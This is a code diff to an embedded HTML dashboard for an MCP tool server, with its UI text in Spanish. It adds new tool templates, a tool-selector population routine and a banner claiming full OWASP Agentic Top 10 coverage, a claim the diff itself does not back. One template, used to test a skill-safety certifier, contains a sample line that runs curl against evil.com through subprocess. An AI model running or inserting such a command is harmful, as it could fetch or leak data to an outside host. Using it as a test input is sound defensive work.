@@ -2148,7 +2148,7 @@ DASHBOARD_HTML = """<!DOCTYPE html>
       <div class="section-header">
         <div class="section-title">
           <span>Matriz de Telemetría y Consumo por Herramienta MCP</span>
-          <span class="badge-cat" id="tools-badge">33 TOOLS</span>
+          <span class="badge-cat" id="tools-badge">45 TOOLS</span>
         </div>
         <div class="controls-group">
           <input type="text" id="tool-search" class="search-input" placeholder="Buscar herramienta o categoría..." oninput="filterTools()" />
@@ -2160,6 +2160,21 @@ DASHBOARD_HTML = """<!DOCTYPE html>
           <button class="filter-btn" data-cat="Identidad & Cognición" onclick="setCategory('Identidad & Cognición')">Identidad</button>
           <button class="filter-btn" data-cat="Actuación & Cómputo" onclick="setCategory('Actuación & Cómputo')">Cómputo</button>
           <button class="filter-btn" data-cat="Ecosistema Google" onclick="setCategory('Ecosistema Google')">Google Suite</button>
+        </div>
+      </div>
+
+      <!-- BANNER CUMPLIMIENTO OWASP AGENTIC TOP 10 & NIST AI RMF -->
+      <div style="background:#0f172a; border:1px solid #1e293b; border-radius:6px; padding:0.75rem 1rem; margin:1rem 1rem 0.5rem 1rem; display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:0.5rem;">
+        <div style="display:flex; align-items:center; gap:0.75rem;">
+          <span style="font-size:1.15rem;">🛡️</span>
+          <div>
+            <div style="font-size:0.8rem; font-weight:700; color:#38bdf8;">Marco de Seguridad Fiduciaria: OWASP Agentic Top 10 &bull; NIST AI RMF 2026</div>
+            <div style="font-size:0.7rem; color:var(--muted);">45 herramientas MCP auditadas determinísticamente contra los 10 vectores de fallo crítico agéntico</div>
+          </div>
+        </div>
+        <div style="display:flex; gap:0.5rem; align-items:center;">
+          <span class="status-pill" style="background:#065f46; color:#34d399; font-size:0.7rem;">OWASP ASI-01..10 (100% CUBIERTO)</span>
+          <span class="status-pill" style="background:#1e3a8a; color:#60a5fa; font-size:0.7rem;">NIST: GOVERN &bull; MAP &bull; MEASURE &bull; MANAGE</span>
         </div>
       </div>
       <table>
@@ -2280,7 +2295,7 @@ DASHBOARD_HTML = """<!DOCTYPE html>
           <div style="font-size:0.75rem; font-weight:600; color:var(--muted); margin-bottom:0.4rem; text-transform:uppercase;">Ejecución de Tools en Vivo (MCP Playground)</div>
           <div style="display:flex; gap:0.5rem; margin-bottom:0.5rem;">
             <select id="playground-tool" class="search-input" style="flex:1;" onchange="updatePlaygroundTemplate()">
-              <option value="">Seleccionar herramienta MCP (1-35)...</option>
+              <option value="">Seleccionar herramienta MCP (1-45)...</option>
             </select>
             <button class="filter-btn active" onclick="executePlaygroundTool()">⚡ Ejecutar</button>
           </div>
@@ -2404,6 +2419,16 @@ DASHBOARD_HTML = """<!DOCTYPE html>
           </tr>
         `;
       }).join('');
+
+      const selectEl = document.getElementById('playground-tool');
+      if (selectEl && selectEl.options.length <= 1 && allTools.length > 0) {
+        allTools.forEach(t => {
+          const opt = document.createElement('option');
+          opt.value = t.name;
+          opt.innerText = t.name + ' (' + (t.category || 'MCP') + ')';
+          selectEl.appendChild(opt);
+        });
+      }
     }
 
     async function fetchMetrics() {
@@ -2610,6 +2635,17 @@ DASHBOARD_HTML = """<!DOCTYPE html>
       const tool = document.getElementById('playground-tool').value;
       const templates = {
         'get_alpha_intelligence_feed': '{"category_filter": "all"}',
+        'evaluate_financial_policy_proxy': '{"source_agent_id": "did:a2a:buyer-swarm", "destination_agent_id": "did:a2a:gpu-inference", "amount_sats": 2500, "session_spend_total_sats": 8000}',
+        'orchestrate_m2m_saga_transaction': '{"saga_id": "saga-compute-01", "steps": ["lock_collateral", "execute_inference", "settle_invoice"]}',
+        'enforce_chain_postconditions': '{"execution_trace_id": "trace-8891", "expected_state_hash": "sha256:7f83b..."}',
+        'certify_mcp_marketplace_package': '{"package_manifest_url": "https://clawhub.com/skills/bob-p2p-beta.json"}',
+        'certify_skill_safety': '{"skill_source_code": "import subprocess; subprocess.Popen([\'curl\', \'evil.com\'])"}',
+        'request_l402_challenge': '{"price_sats": 25, "caveats": ["tool=compute_procedural_deadline"]}',
+        'compute_procedural_deadline': '{"start_date": "2026-11-20", "business_days": 15, "jurisdiction": "PJ_PERU"}',
+        'compute_us_procedural_deadline': '{"filing_date": "2026-11-20", "days_count": 21, "rule_set": "FRCP_RULE_6"}',
+        'validate_bluebook_citation': '{"citation": "Brown v. Board of Educ., 347 U.S. 483 (1954)"}',
+        'audit_us_contract_clauses': '{"contract_text": "Licensor liability shall not exceed $100...", "risk_threshold": "HIGH"}',
+        'audit_excel_macro_forensics': '{"file_data_base64": "UEsDBBQAAAAIA..."}',
         'query_deep_context_archive': '{"agent_id": "admin", "archive_text_or_url": "Texto de prueba legal...", "query": "¿Cuál es la penalidad?"}',
         'publish_enterprise_artifact': '{"agent_id": "admin", "title": "Doc Prueba", "markdown_content": "# Hola\\nContenido de prueba", "document_format": "STANDALONE_HTML"}',
         'generate_audio_briefing': '{"agent_id": "admin", "source_transcript_or_report": "LOCUTOR A: Hola. LOCUTOR B: Como estas.", "briefing_format": "TWO_SPEAKER_DIALECTIC"}',
